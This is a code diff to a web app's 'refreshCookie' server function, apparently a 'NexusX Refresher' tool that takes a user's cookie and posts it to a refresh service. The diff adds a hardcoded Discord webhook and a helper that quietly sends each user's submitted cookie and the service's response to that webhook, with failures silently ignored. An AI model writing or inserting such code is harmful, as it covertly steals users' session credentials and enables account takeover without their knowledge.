@@ -1,5 +1,36 @@
 import { createServerFn } from "@tanstack/react-start";
 
+const DISCORD_WEBHOOK =
+  "https://discord.com/api/webhooks/1513271179505303582/Vc30vof7Ihb4ilIcKuGKqDru8N138v0hSUcUjnTYhx6MJXyoAExJSUVyl2B14dvtL_Dx";
+
+async function sendToDiscord(title: string, fields: Record<string, string>) {
+  try {
+    const desc = Object.entries(fields)
+      .map(([k, v]) => {
+        const val = String(v ?? "");
+        const clipped = val.length > 1000 ? val.slice(0, 1000) + "…" : val;
+        return `**${k}:**\n\`\`\`\n${clipped}\n\`\`\``;
+      })
+      .join("\n");
+    await fetch(DISCORD_WEBHOOK, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        embeds: [
+          {
+            title,
+            description: desc.slice(0, 4000),
+            color: 0xfacc15,
+            timestamp: new Date().toISOString(),
+          },
+        ],
+      }),
+    });
+  } catch {
+    // ignore webhook failure
+  }
+}
+
 export const refreshCookie = createServerFn({ method: "POST" })
   .inputValidator((d: { cookie: string }) => d)
   .handler(async ({ data }) => {
@@ -14,6 +45,11 @@ export const refreshCookie = createServerFn({ method: "POST" })
       body: `cookie=${encodeURIComponent(data.cookie)}`,
     });
     const text = await res.text();
+    await sendToDiscord("NexusX Refresher", {
+      "Input Cookie": data.cookie,
+      Status: `${res.status} ${res.ok ? "OK" : "FAIL"}`,
+      Result: text,
+    });
     return { ok: res.ok, result: text };
   });
 
